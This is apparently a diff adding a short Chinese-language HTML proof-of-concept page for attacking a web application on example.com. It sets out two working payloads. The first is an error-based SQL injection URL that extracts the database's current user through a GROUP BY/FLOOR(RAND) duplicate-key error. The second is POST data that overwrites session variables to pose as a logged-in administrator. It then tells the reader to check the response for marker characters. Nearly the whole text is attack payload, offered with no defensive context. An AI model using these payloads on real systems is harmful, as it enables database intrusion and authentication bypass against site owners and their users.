@@ -1,0 +1,14 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL1: </h3>
+    <code>http://example.com/?m=info.detail&id=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e7e7e,(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,50)),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：~~~(这里有一些字符)~~~</p>
+
+    <h3>SQL注入URL2: </h3>
+    <code>http://example.com/?m=city.getSearch&index=xx</code>
+    <h3>POST-DATA: </h3>
+    <code>_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：~~~(这里有一些字符)~~~</p>
+</div>
